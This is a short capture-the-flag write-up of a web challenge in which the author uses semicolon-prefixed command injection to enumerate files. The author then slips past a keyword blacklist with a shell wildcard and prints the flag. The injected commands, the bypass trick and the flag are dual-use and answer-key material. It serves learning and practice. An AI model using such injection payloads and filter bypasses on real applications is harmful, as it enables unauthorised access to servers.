# AsciiArt - CTF Writeup
# Web(Med)

The challenge was a Web challenge where the description said that the website would "answer your command". I suspected that the input might be executed as a system command, so I started by testing it.

First, I entered:

;id

The output was:

uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)

This confirmed that I had command injection.

I then listed the files in the current directory:

;ls

This showed:

Dockerfile
app.py
dontopnme.txt
requirements.txt
static
templates

I noticed dontopnme.txt, so I tried reading the text files using head:

;head *txt

It gave me the clue:

"Yall never listen, the flag is not here, dont be greedy.
tho the flag is inside a directory within the static directory."

So I recursively listed the static directory:

;ls -R static

This showed the path:

static/proud/of/you/flag.txt

I tried accessing the file normally, but the application had a blacklist that blocked the words cat, flag, and tac.

Instead of directly writing flag.txt, I used a shell wildcard:

;head static/proud/of/you/f*.txt

The  * matches the remaining characters, so the shell expands f*.txt to flag.txt gi. This bypassed the blacklist and displayed the flag.

Commands used:

;id
;ls
;head *txt
;ls -R static
;head static/proud/of/you/f*.txt

flag-bi0s{y0u_4r3_4l0t_m0r3_cr34t1v3_th4n_1_3xp3ct3d}
